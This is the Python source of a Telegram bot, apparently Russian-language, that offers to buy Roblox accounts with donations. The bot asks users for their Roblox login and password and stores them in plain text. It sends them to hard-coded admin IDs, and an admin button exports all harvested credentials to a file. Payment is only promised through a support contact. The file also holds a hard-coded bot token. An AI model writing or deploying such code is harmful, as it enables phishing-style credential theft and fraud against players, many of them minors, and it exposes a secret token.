import asyncio
import json
import logging
from datetime import datetime
from typing import Dict, List
import os

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "8513174516:AAFgYgpzsMGhxccUcxHSHCSUGBecD1ZQcj8"
ADMIN_IDS = [7973988177, 7913162121]
SUPPORT_CONTACT = "@starbrik"

# Курсы
ROBUX_PRICE = 0.2  # 1 robux = 0.2₽
DONATE_PRICE = 0.01  # 1 общий донат = 0.01₽
RAP_PRICE = 0.02  # 1 RAP = 0.02₽
VOICE_CHAT_BONUS = 5  # +5₽ за войс чат
PREMIUM_BONUS = 20  # +20₽ за премиум

# Файлы данных
USERS_FILE = "users.json"
ACCOUNTS_FILE = "accounts.json"
STATS_FILE = "stats.json"

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Состояния FSM
class Form(StatesGroup):
    waiting_for_login = State()
    waiting_for_password = State()
    waiting_for_robux = State()
    waiting_for_donate = State()
    waiting_for_rap = State()
    waiting_for_voice_chat = State()
    waiting_for_premium = State()
    waiting_for_broadcast = State()
    waiting_for_user_id = State()
    waiting_for_balance_change = State()

# Загрузка данных
def load_data(filename, default={}):
    try:
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception as e:
        logger.error(f"Ошибка загрузки {filename}: {e}")
    return default

def save_data(filename, data):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения {filename}: {e}")

# Инициализация данных
users = load_data(USERS_FILE, {})
accounts = load_data(ACCOUNTS_FILE, {})
stats = load_data(STATS_FILE, {
    "total_accounts": 0,
    "approved_accounts": 0,
    "rejected_accounts": 0,
    "total_payouts": 0.0,
    "total_robux": 0,
    "total_donate": 0,
    "total_rap": 0
})

# Клавиатуры
def get_main_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="💰 Продать аккаунт Roblox"), KeyboardButton(text="📤 Вывод средств")],
            [KeyboardButton(text="👤 Мой профиль"), KeyboardButton(text="📞 Поддержка")]
        ],
        resize_keyboard=True
    )

def get_admin_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
            [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")],
            [InlineKeyboardButton(text="💰 Изменить баланс", callback_data="admin_change_balance")],
            [InlineKeyboardButton(text="📥 Выгрузить аккаунты", callback_data="admin_download_accounts")],
            [InlineKeyboardButton(text="⏳ Активные заявки", callback_data="admin_pending_requests")],
            [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_back")]
        ]
    )

def get_approve_keyboard(account_id: str):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Одобрить", callback_data=f"approve_{account_id}"),
                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{account_id}")
            ]
        ]
    )

def get_yes_no_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="✅ Да"), KeyboardButton(text="❌ Нет")]
        ],
        resize_keyboard=True
    )

# Команда /start
@dp.message(Command("start"))
async def cmd_start(message: Message):
    user_id = str(message.from_user.id)
    
    if user_id not in users:
        users[user_id] = {
            "username": message.from_user.username,
            "first_name": message.from_user.first_name,
            "balance": 0.0,
            "total_earned": 0.0,
            "accounts_sold": 0,
            "withdrawals": [],
            "joined_date": datetime.now().isoformat()
        }
        save_data(USERS_FILE, users)
    
    welcome_text = f"""
🎮 Добро пожаловать в Roblox Accounts Exchange!

💰 Мы покупаем аккаунты Roblox с донатом

📊 Курсы расчета:
• Robux: 1 = {ROBUX_PRICE}₽ (0-100,000)
• Общий донат: 1 = {DONATE_PRICE}₽ (0-1,000,000)
• RAP: 1 = {RAP_PRICE}₽ (0-1,000,000)
• Войс чат: +{VOICE_CHAT_BONUS}₽
• Премиум: +{PREMIUM_BONUS}₽

📞 Поддержка: {SUPPORT_CONTACT}
"""
    await message.answer(welcome_text, reply_markup=get_main_keyboard())

# Продажа аккаунта
@dp.message(F.text == "💰 Продать аккаунт Roblox")
async def sell_account_start(message: Message, state: FSMContext):
    await message.answer(
        "🔐 Введите логин от аккаунта Roblox:"
    )
    await state.set_state(Form.waiting_for_login)

@dp.message(Form.waiting_for_login)
async def process_login(message: Message, state: FSMContext):
    login = message.text.strip()
    if len(login) < 3:
        await message.answer("❌ Логин слишком короткий! Введите логин:")
        return
    
    await state.update_data(login=login)
    await message.answer(
        "🔑 Теперь введите пароль от аккаунта:"
    )
    await state.set_state(Form.waiting_for_password)

@dp.message(Form.waiting_for_password)
async def process_password(message: Message, state: FSMContext):
    password = message.text.strip()
    if len(password) < 3:
        await message.answer("❌ Пароль слишком короткий! Введите пароль:")
        return
    
    await state.update_data(password=password)
    await message.answer(
        f"💰 Введите количество Robux на аккаунте (0-100,000):\n"
        f"📊 Курс: 1 Robux = {ROBUX_PRICE}₽"
    )
    await state.set_state(Form.waiting_for_robux)

@dp.message(Form.waiting_for_robux)
async def process_robux(message: Message, state: FSMContext):
    try:
        robux = int(message.text)
        if robux < 0 or robux > 100000:
            await message.answer("❌ Введите число от 0 до 100,000:")
            return
        
        await state.update_data(robux=robux)
        await message.answer(
            f"💰 Введите общий донат на аккаунте (0-1,000,000):\n"
            f"📊 Курс: 1 донат = {DONATE_PRICE}₽"
        )
        await state.set_state(Form.waiting_for_donate)
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число!")

@dp.message(Form.waiting_for_donate)
async def process_donate(message: Message, state: FSMContext):
    try:
        donate = int(message.text)
        if donate < 0 or donate > 1000000:
            await message.answer("❌ Введите число от 0 до 1,000,000:")
            return
        
        await state.update_data(donate=donate)
        await message.answer(
            f"💰 Введите RAP аккаунта (0-1,000,000):\n"
            f"📊 Курс: 1 RAP = {RAP_PRICE}₽"
        )
        await state.set_state(Form.waiting_for_rap)
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число!")

@dp.message(Form.waiting_for_rap)
async def process_rap(message: Message, state: FSMContext):
    try:
        rap = int(message.text)
        if rap < 0 or rap > 1000000:
            await message.answer("❌ Введите число от 0 до 1,000,000:")
            return
        
        await state.update_data(rap=rap)
        await message.answer(
            f"🎤 Есть ли на аккаунте войс чат?\n"
            f"💰 Бонус: +{VOICE_CHAT_BONUS}₽",
            reply_markup=get_yes_no_keyboard()
        )
        await state.set_state(Form.waiting_for_voice_chat)
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число!")

@dp.message(Form.waiting_for_voice_chat)
async def process_voice_chat(message: Message, state: FSMContext):
    if message.text not in ["✅ Да", "❌ Нет"]:
        await message.answer("❌ Пожалуйста, используйте кнопки:", reply_markup=get_yes_no_keyboard())
        return
    
    voice_chat = message.text == "✅ Да"
    await state.update_data(voice_chat=voice_chat)
    
    await message.answer(
        f"⭐ Есть ли на аккаунте премиум (Premium)?\n"
        f"💰 Бонус: +{PREMIUM_BONUS}₽",
        reply_markup=get_yes_no_keyboard()
    )
    await state.set_state(Form.waiting_for_premium)

@dp.message(Form.waiting_for_premium)
async def process_premium(message: Message, state: FSMContext):
    if message.text not in ["✅ Да", "❌ Нет"]:
        await message.answer("❌ Пожалуйста, используйте кнопки:", reply_markup=get_yes_no_keyboard())
        return
    
    premium = message.text == "✅ Да"
    data = await state.get_data()
    
    # Рассчитываем стоимость
    login = data.get("login", "")
    password = data.get("password", "")
    robux = data.get("robux", 0)
    donate = data.get("donate", 0)
    rap = data.get("rap", 0)
    voice_chat = data.get("voice_chat", False)
    premium_bonus = data.get("premium", False)
    
    # Расчет стоимости
    robux_cost = robux * ROBUX_PRICE
    donate_cost = donate * DONATE_PRICE
    rap_cost = rap * RAP_PRICE
    voice_chat_cost = VOICE_CHAT_BONUS if voice_chat else 0
    premium_cost = PREMIUM_BONUS if premium else 0
    
    total_cost = robux_cost + donate_cost + rap_cost + voice_chat_cost + premium_cost
    
    user_id = str(message.from_user.id)
    
    # Сохраняем аккаунт
    account_id = f"{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    accounts[account_id] = {
        "user_id": user_id,
        "login": login,
        "password": password,
        "robux": robux,
        "donate": donate,
        "rap": rap,
        "voice_chat": voice_chat,
        "premium": premium,
        "robux_cost": robux_cost,
        "donate_cost": donate_cost,
        "rap_cost": rap_cost,
        "voice_chat_cost": voice_chat_cost,
        "premium_cost": premium_cost,
        "total_cost": total_cost,
        "date": datetime.now().isoformat(),
        "status": "pending"
    }
    
    # Обновляем статистику
    stats["total_accounts"] += 1
    stats["total_robux"] += robux
    stats["total_donate"] += donate
    stats["total_rap"] += rap
    
    save_data(ACCOUNTS_FILE, accounts)
    save_data(STATS_FILE, stats)
    
    # Отправляем результат пользователю
    result_text = f"""
✅ Данные аккаунта получены!

📋 Детали аккаунта:
👤 Логин: {login}
💰 Robux: {robux} = {robux_cost:.2f}₽
💸 Донат: {donate} = {donate_cost:.2f}₽
📊 RAP: {rap} = {rap_cost:.2f}₽
🎤 Войс чат: {'✅ Да' if voice_chat else '❌ Нет'} = {voice_chat_cost}₽
⭐ Премиум: {'✅ Да' if premium else '❌ Нет'} = {premium_cost}₽

💵 ИТОГО: {total_cost:.2f}₽

⏳ Аккаунт отправлен на проверку.
✅ Средства будут зачислены в течение 1-24 часов.
"""
    await message.answer(result_text, reply_markup=get_main_keyboard())
    
    # Уведомление админам
    for admin_id in ADMIN_IDS:
        try:
            admin_text = f"""
🆕 НОВАЯ ЗАЯВКА НА ПРОДАЖУ!

👤 Пользователь: @{message.from_user.username or 'Нет username'}
🆔 User ID: {user_id}

🔐 ДАННЫЕ АККАУНТА:
👤 Логин: {login}
🔒 Пароль: {password}

📊 ДЕТАЛИ АККАУНТА:
💰 Robux: {robux} = {robux_cost:.2f}₽
💸 Донат: {donate} = {donate_cost:.2f}₽
📊 RAP: {rap} = {rap_cost:.2f}₽
🎤 Войс чат: {'✅' if voice_chat else '❌'}
⭐ Премиум: {'✅' if premium else '❌'}

💵 ОБЩАЯ СТОИМОСТЬ: {total_cost:.2f}₽
🆔 ID заявки: {account_id}
"""
            await bot.send_message(
                admin_id,
                admin_text,
                reply_markup=get_approve_keyboard(account_id)
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления админа {admin_id}: {e}")
    
    await state.clear()

# Вывод средств
@dp.message(F.text == "📤 Вывод средств")
async def withdraw_funds(message: Message):
    user_id = str(message.from_user.id)
    user = users.get(user_id)
    
    if not user:
        await message.answer("❌ Пользователь не найден!")
        return
    
    if user["balance"] < 20:
        await message.answer(
            f"❌ Минимальная сумма вывода: 20₽\n"
            f"💰 Ваш баланс: {user['balance']:.2f}₽\n\n"
            f"📞 Для вывода напишите в поддержку: {SUPPORT_CONTACT}"
        )
        return
    
    await message.answer(
        f"💰 Ваш баланс: {user['balance']:.2f}₽\n\n"
        f"📞 Для вывода средств напишите в поддержку:\n{SUPPORT_CONTACT}\n\n"
        f"💳 Укажите в сообщении:\n"
        f"1. Сумму вывода\n"
        f"2. Способ вывода (Crypto Bot или СБП)\n"
        f"3. Ваши реквизиты\n\n"
        f"⚠️ Минимальная сумма:\n"
        f"• Crypto Bot: 20₽\n"
        f"• СБП: 100₽"
    )

# Мой профиль
@dp.message(F.text == "👤 Мой профиль")
async def my_profile(message: Message):
    user_id = str(message.from_user.id)
    user = users.get(user_id)
    
    if not user:
        await message.answer("❌ Пользователь не найден!")
        return
    
    withdrawals_count = len(user.get("withdrawals", []))
    pending_withdrawals = sum(w["amount"] for w in user.get("withdrawals", []) if w.get("status") == "pending")
    
    # Считаем активные заявки
    active_requests = len([acc for acc in accounts.values() 
                          if acc['user_id'] == user_id and acc.get('status') == 'pending'])
    
    await message.answer(
        f"👤 Ваш профиль:\n\n"
        f"💰 Баланс: {user['balance']:.2f}₽\n"
        f"⏳ В обработке: {pending_withdrawals:.2f}₽\n"
        f"📦 Продано аккаунтов: {user.get('accounts_sold', 0)}\n"
        f"💸 Всего заработано: {user.get('total_earned', 0):.2f}₽\n"
        f"📤 Выводов: {withdrawals_count}\n"
        f"⏳ Активных заявок: {active_requests}\n"
        f"📅 Дата регистрации: {user['joined_date'][:10]}"
    )

# Поддержка
@dp.message(F.text == "📞 Поддержка")
async def support(message: Message):
    await message.answer(
        f"📞 Связь с поддержкой:\n\n"
        f"👤 Контакт: {SUPPORT_CONTACT}\n\n"
        f"📋 По всем вопросам:\n"
        f"• Проверка аккаунтов\n"
        f"• Вывод средств\n"
        f"• Проблемы с ботом\n"
        f"• Сотрудничество\n\n"
        f"⏳ Время ответа: 1-12 часов"
    )

# Проверка админа
def is_admin(user_id):
    return user_id in ADMIN_IDS

# Админ команда
@dp.message(Command("admin"))
async def cmd_admin(message: Message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.answer("❌ Доступ запрещен!")
        return
    
    await message.answer("👨‍💻 Панель администратора", reply_markup=get_admin_keyboard())

# Обработка админ кнопок
@dp.callback_query(F.data.startswith("admin_"))
async def process_admin_actions(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    
    if not is_admin(user_id):
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return
    
    if callback.data == "admin_stats":
        total_balance = sum(user["balance"] for user in users.values())
        active_users = len([u for u in users.values() if u["balance"] > 0])
        pending_requests = len([acc for acc in accounts.values() if acc.get('status') == 'pending'])
        
        stats_text = (
            f"📊 Статистика бота:\n\n"
            f"👥 Всего пользователей: {len(users)}\n"
            f"👥 Активных пользователей: {active_users}\n"
            f"📦 Всего аккаунтов: {stats['total_accounts']}\n"
            f"✅ Одобрено: {stats['approved_accounts']}\n"
            f"❌ Отклонено: {stats['rejected_accounts']}\n"
            f"⏳ Ожидают проверки: {pending_requests}\n"
            f"💰 Общий баланс всех: {total_balance:.2f}₽\n"
            f"💸 Выплачено всего: {stats['total_payouts']:.2f}₽\n\n"
            f"📊 Robux всего: {stats['total_robux']:,}\n"
            f"💸 Донат всего: {stats['total_donate']:,}\n"
            f"📈 RAP всего: {stats['total_rap']:,}"
        )
        await callback.message.edit_text(stats_text)
        
    elif callback.data == "admin_broadcast":
        await callback.message.edit_text("📢 Введите сообщение для рассылки всем пользователям:")
        await state.set_state(Form.waiting_for_broadcast)
        
    elif callback.data == "admin_change_balance":
        await callback.message.edit_text("💰 Введите ID пользователя, которому нужно изменить баланс:")
        await state.set_state(Form.waiting_for_user_id)
        
    elif callback.data == "admin_download_accounts":
        if not accounts:
            await callback.answer("❌ Нет данных об аккаунтах!", show_alert=True)
            return
        
        # Создаем файл с аккаунтами
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"accounts_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"=== ВЫГРУЗКА АККАУНТОВ ROBOX ===\n")
            f.write(f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Всего аккаунтов: {len(accounts)}\n")
            f.write("=" * 60 + "\n\n")
            
            for i, (acc_id, acc_data) in enumerate(accounts.items(), 1):
                f.write(f"🎮 АККАУНТ #{i}\n")
                f.write(f"📋 ID заявки: {acc_id}\n")
                f.write(f"👤 User ID: {acc_data['user_id']}\n")
                f.write(f"🔑 Логин: {acc_data['login']}\n")
                f.write(f"🔒 Пароль: {acc_data['password']}\n")
                f.write(f"💰 Robux: {acc_data['robux']} = {acc_data['robux_cost']:.2f}₽\n")
                f.write(f"💸 Донат: {acc_data['donate']} = {acc_data['donate_cost']:.2f}₽\n")
                f.write(f"📊 RAP: {acc_data['rap']} = {acc_data['rap_cost']:.2f}₽\n")
                f.write(f"🎤 Войс чат: {'Да' if acc_data['voice_chat'] else 'Нет'} = {acc_data['voice_chat_cost']}₽\n")
                f.write(f"⭐ Премиум: {'Да' if acc_data['premium'] else 'Нет'} = {acc_data['premium_cost']}₽\n")
                f.write(f"💵 Итого: {acc_data['total_cost']:.2f}₽\n")
                f.write(f"📅 Дата: {acc_data['date'][:19]}\n")
                status = acc_data.get('status', 'pending')
                status_emoji = "✅" if status == "approved" else "❌" if status == "rejected" else "⏳"
                f.write(f"📊 Статус: {status_emoji} {status}\n")
                f.write("-" * 50 + "\n\n")
        
        # Отправляем файл админу
        try:
            await bot.send_document(
                chat_id=user_id,
                document=FSInputFile(filename),
                caption=f"📥 Выгрузка аккаунтов\n📊 Всего: {len(accounts)} аккаунтов"
            )
            os.remove(filename)
        except Exception as e:
            logger.error(f"Ошибка отправки файла: {e}")
            await callback.message.answer(f"❌ Ошибка при создании файла: {e}")
        
    elif callback.data == "admin_pending_requests":
        pending_accounts = [(acc_id, acc) for acc_id, acc in accounts.items() if acc.get('status') == 'pending']
        
        if not pending_accounts:
            await callback.answer("✅ Нет заявок, ожидающих проверки!", show_alert=True)
            return
        
        # Отправляем первую заявку
        account_id, account = pending_accounts[0]
        
        request_text = f"""
⏳ ЗАЯВКА НА ПРОВЕРКУ #{1}/{len(pending_accounts)}

👤 Пользователь: {account['user_id']}
🆔 ID заявки: {account_id}

🔐 ДАННЫЕ АККАУНТА:
👤 Логин: {account['login']}
🔒 Пароль: {account['password']}

📊 ДЕТАЛИ АККАУНТА:
💰 Robux: {account['robux']} = {account['robux_cost']:.2f}₽
💸 Донат: {account['donate']} = {account['donate_cost']:.2f}₽
📊 RAP: {account['rap']} = {account['rap_cost']:.2f}₽
🎤 Войс чат: {'✅ Да' if account['voice_chat'] else '❌ Нет'} = {account['voice_chat_cost']}₽
⭐ Премиум: {'✅ Да' if account['premium'] else '❌ Нет'} = {account['premium_cost']}₽

💵 ОБЩАЯ СТОИМОСТЬ: {account['total_cost']:.2f}₽
📅 Дата: {account['date'][:19]}
"""
        await callback.message.edit_text(request_text, reply_markup=get_approve_keyboard(account_id))
        
    elif callback.data == "admin_back":
        await callback.message.delete()
        await callback.message.answer("🔙 Возврат в главное меню")
    
    await callback.answer()

# Одобрение заявки
@dp.callback_query(F.data.startswith("approve_"))
async def approve_request(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return
    
    account_id = callback.data.replace("approve_", "")
    account = accounts.get(account_id)
    
    if not account:
        await callback.answer("❌ Заявка не найдена!", show_alert=True)
        return
    
    # Обновляем статус аккаунта
    account['status'] = 'approved'
    account['approved_by'] = callback.from_user.id
    account['approved_at'] = datetime.now().isoformat()
    save_data(ACCOUNTS_FILE, accounts)
    
    # Обновляем статистику
    stats['approved_accounts'] += 1
    save_data(STATS_FILE, stats)
    
    # Начисляем средства пользователю
    user_id = account['user_id']
    if user_id in users:
        users[user_id]['balance'] = round(users[user_id].get('balance', 0) + account['total_cost'], 2)
        users[user_id]['total_earned'] = round(users[user_id].get('total_earned', 0) + account['total_cost'], 2)
        users[user_id]['accounts_sold'] = users[user_id].get('accounts_sold', 0) + 1
        save_data(USERS_FILE, users)
    
    # Уведомляем пользователя
    try:
        await bot.send_message(
            int(user_id),
            f"✅ ВАША ЗАЯВКА ОДОБРЕНА!\n\n"
            f"💰 Зачислено: {account['total_cost']:.2f}₽\n"
            f"💎 Ваш баланс: {users[user_id].get('balance', 0):.2f}₽\n\n"
            f"🔐 Детали аккаунта:\n"
            f"👤 Логин: {account['login']}\n"
            f"💰 Robux: {account['robux']}\n"
            f"💸 Донат: {account['donate']}\n"
            f"📊 RAP: {account['rap']}"
        )
    except Exception as e:
        logger.error(f"Ошибка уведомления пользователя {user_id}: {e}")
    
    await callback.message.edit_text(
        f"✅ Заявка одобрена!\n"
        f"💰 Пользователю начислено: {account['total_cost']:.2f}₽\n"
        f"👤 User ID: {user_id}"
    )
    
    await callback.answer("✅ Заявка одобрена!")

# Отклонение заявки
@dp.callback_query(F.data.startswith("reject_"))
async def reject_request(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Доступ запрещен!", show_alert=True)
        return
    
    account_id = callback.data.replace("reject_", "")
    account = accounts.get(account_id)
    
    if not account:
        await callback.answer("❌ Заявка не найдена!", show_alert=True)
        return
    
    # Обновляем статус аккаунта
    account['status'] = 'rejected'
    account['rejected_by'] = callback.from_user.id
    account['rejected_at'] = datetime.now().isoformat()
    save_data(ACCOUNTS_FILE, accounts)
    
    # Обновляем статистику
    stats['rejected_accounts'] += 1
    save_data(STATS_FILE, stats)
    
    # Уведомляем пользователя
    user_id = account['user_id']
    try:
        await bot.send_message(
            int(user_id),
            f"❌ ВАША ЗАЯВКА ОТКЛОНЕНА\n\n"
            f"🔐 Аккаунт: {account['login']}\n"
            f"💰 Сумма: {account['total_cost']:.2f}₽\n\n"
            f"📞 Если считаете это ошибкой, напишите в поддержку: {SUPPORT_CONTACT}"
        )
    except Exception as e:
        logger.error(f"Ошибка уведомления пользователя {user_id}: {e}")
    
    await callback.message.edit_text(
        f"❌ Заявка отклонена!\n"
        f"👤 User ID: {user_id}\n"
        f"🔐 Аккаунт: {account['login']}"
    )
    
    await callback.answer("❌ Заявка отклонена!")

# Рассылка сообщений
@dp.message(Form.waiting_for_broadcast)
async def process_broadcast(message: Message, state: FSMContext):
    text = message.text
    sent = 0
    failed = 0
    
    for user_id in users.keys():
        try:
            await bot.send_message(int(user_id), f"📢 Рассылка от администратора:\n\n{text}")
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Ошибка отправки {user_id}: {e}")
            failed += 1
    
    await message.answer(
        f"✅ Рассылка завершена!\n"
        f"📤 Отправлено: {sent}\n"
        f"❌ Не отправлено: {failed}"
    )
    await state.clear()

# Изменение баланса
@dp.message(Form.waiting_for_user_id)
async def process_user_id_for_balance(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    if user_id not in users:
        await message.answer("❌ Пользователь не найден!")
        return
    
    await state.update_data(balance_user_id=user_id)
    await message.answer(
        f"👤 Пользователь: {user_id}\n"
        f"💰 Текущий баланс: {users[user_id]['balance']:.2f}₽\n\n"
        "Введите новую сумму баланса:"
    )
    await state.set_state(Form.waiting_for_balance_change)

@dp.message(Form.waiting_for_balance_change)
async def process_balance_change(message: Message, state: FSMContext):
    try:
        new_balance = float(message.text.replace(',', '.'))
        data = await state.get_data()
        user_id = data.get("balance_user_id")
        
        old_balance = users[user_id]["balance"]
        users[user_id]["balance"] = new_balance
        save_data(USERS_FILE, users)
        
        await message.answer(
            f"✅ Баланс изменен!\n"
            f"👤 Пользователь: {user_id}\n"
            f"💰 Было: {old_balance:.2f}₽\n"
            f"💰 Стало: {new_balance:.2f}₽"
        )
        
        # Уведомляем пользователя
        try:
            await bot.send_message(
                int(user_id),
                f"💰 Ваш баланс был изменен администратором!\n"
                f"📊 Новый баланс: {new_balance:.2f}₽"
            )
        except:
            pass
            
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число!")
    
    await state.clear()

# Запуск бота
async def main():
    # Автосохранение
    async def auto_save():
        while True:
            await asyncio.sleep(300)
            save_data(USERS_FILE, users)
            save_data(ACCOUNTS_FILE, accounts)
            save_data(STATS_FILE, stats)
            logger.info("📁 Данные сохранены")
    
    asyncio.create_task(auto_save())
    
    print("=" * 50)
    print("🎮 Roblox Accounts Exchange Bot запущен!")
    print(f"👑 Админы: {ADMIN_IDS}")
    print(f"📞 Поддержка: {SUPPORT_CONTACT}")
    print(f"💰 Курсы:")
    print(f"  • Robux: {ROBUX_PRICE}₽ за 1")
    print(f"  • Донат: {DONATE_PRICE}₽ за 1")
    print(f"  • RAP: {RAP_PRICE}₽ за 1")
    print(f"  • Войс чат: +{VOICE_CHAT_BONUS}₽")
    print(f"  • Премиум: +{PREMIUM_BONUS}₽")
    print("=" * 50)
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    # Создаем файлы данных если их нет
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump({}, f, ensure_ascii=False, indent=2)
    
    if not os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
            json.dump({}, f, ensure_ascii=False, indent=2)
    
    if not os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump({
                "total_accounts": 0,
                "approved_accounts": 0,
                "rejected_accounts": 0,
                "total_payouts": 0.0,
                "total_robux": 0,
                "total_donate": 0,
                "total_rap": 0
            }, f, ensure_ascii=False, indent=2)
    
    asyncio.run(main())
